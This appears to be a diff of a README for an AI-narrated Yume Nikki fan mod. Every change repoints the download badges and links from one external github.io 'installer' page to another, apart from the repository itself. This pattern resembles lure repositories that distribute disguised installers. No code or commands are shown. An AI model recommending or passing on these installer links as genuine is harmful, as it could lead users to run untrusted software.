@@ -2,9 +2,9 @@
 
 # Yume Nikki — AI Edition
 
-[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://mixedlinkrelease.github.io/installer/)
-[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://mixedlinkrelease.github.io/installer/)
-[![Twenty-four effects](https://img.shields.io/badge/Effects-24%20Collected-4b3f6b?style=for-the-badge)](https://mixedlinkrelease.github.io/installer/)
+[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://BursarHypnotize.github.io/install-win/)
+[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://BursarHypnotize.github.io/install-win/)
+[![Twenty-four effects](https://img.shields.io/badge/Effects-24%20Collected-4b3f6b?style=for-the-badge)](https://BursarHypnotize.github.io/install-win/)
 
 [![Local](https://img.shields.io/badge/100%25-Local%20%26%20Private-brightgreen?style=flat-square)](https://github.com/dustlordtrench/yume-nikki-ai-edition)
 [![Offline](https://img.shields.io/badge/Works-Offline-informational?style=flat-square)](https://github.com/dustlordtrench/yume-nikki-ai-edition)
@@ -55,7 +55,7 @@ A locally-hosted model narrates the worlds instead — generating descriptions, 
 
 ### Step 1 — Get the mod
 
-[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://BursarHypnotize.github.io/install-win/)
 
 ### Step 2 — Install Ollama (the local AI engine)
 
@@ -146,7 +146,7 @@ CPU-only inference is supported and slower. No GPU is strictly required.
 
 ## 🔗 Links
 
-- **[⬇ Download the latest version](https://mixedlinkrelease.github.io/installer/)**
+- **[⬇ Download the latest version](https://BursarHypnotize.github.io/install-win/)**
 - [Repository](https://github.com/dustlordtrench/yume-nikki-ai-edition)
 - [Ollama — local AI runtime](https://ollama.com)
 - [Ollama model library](https://ollama.com/library)
